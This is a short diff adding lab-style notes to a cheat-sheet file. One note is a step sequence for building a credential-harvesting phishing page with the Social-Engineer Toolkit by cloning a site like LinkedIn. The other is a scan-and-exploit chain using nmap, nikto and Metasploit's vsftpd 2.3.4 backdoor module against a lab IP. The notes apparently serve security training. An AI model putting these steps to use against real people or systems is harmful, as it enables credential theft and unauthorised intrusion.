@@ -100,6 +100,16 @@ ls -l
 exit
 
 
+Phising
+sudo su → setoolkit → Select 1 (Social-Engineering) → 2 (Website Attack) → 3 (Credential Harvester) → 
+Enter cloned site URL (e.g., LinkedIn) → Host IP → Send phishing link.
+
+Web Vulnerability
+sudo nmap -sS -sV 192.168.56.101 → sudo apt install nikto → msfconsole → 
+use exploit/unix/ftp/vsftpd_234_backdoor → set RHOST 192.168.56.101 → exploit.
+
+
+
 
 
 
